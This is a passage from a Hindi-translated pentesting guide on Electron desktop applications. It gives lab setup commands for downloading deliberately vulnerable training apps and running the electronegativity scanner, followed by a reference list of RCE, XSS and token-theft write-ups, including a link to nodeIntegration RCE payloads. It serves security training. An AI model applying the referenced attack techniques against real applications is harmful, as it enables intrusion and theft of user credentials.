ये commands lab पूरा करने में आपकी मदद करेंगी:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

पहले प्रकाशित पता, मौजूदा bookmarks के लिए: [Electron desktop apps](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation)। पूरे पेज का route यहाँ redirect होता है; ऐतिहासिक fragment को बनाए नहीं रखा गया है।

## References

- [1] [Electron applications में Phishing और credential harvesting](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Facebook Messenger Desktop App में Arbitrary File Read](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: context isolation की कमी का दुरुपयोग - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [XSS और RCE के साथ Modern Desktop apps की Hacking Workshop](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - Electron.js (in)security के संसाधनों की चुनी हुई सूची](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Electron APIs का Misuse: Attacker की पहली पसंद](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE payloads](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [Electron Applications में 1-click RCE](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Electron के shell.openExternal() के खतरे - remote code execution तक पहुँचने के कई रास्ते](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [arbitrary URLs की अनुमति दें, arbitrary code execution की अपेक्षा करें](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [obsolete Electron feature से प्रसिद्ध Japanese chat tool में RCE हासिल करना](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Remote Code Execution](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Restricted Mode में Remote Code Execution (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [VS Code Webview Keyboard Event Injection के ज़रिए One-Click GitHub Token Theft](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code issue #319593: Webviews, main workbench में arbitrary keyboard shortcuts trigger कर सकते हैं](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: notebook खोलने की पुष्टि करें और caller-provided installExtension context स्वीकार करना बंद करें](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: notebook webviews में programmatic webview keypress/click re-dispatch को block करें](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / local workspace extensions](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: मैंने 2 हफ़्तों में हर बड़े IDE को कैसे Hack किया](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Electron पर नए attack surface का पता लगाते हुए लोकप्रिय Desktop Apps पर कब्ज़ा](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron Security](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: कुछ भी Reverse Engineer करें](https://github.com/morluto/rea)
- [24] [REA JavaScript artifact reconstruction](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [REA cross-layer JavaScript application workflows](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
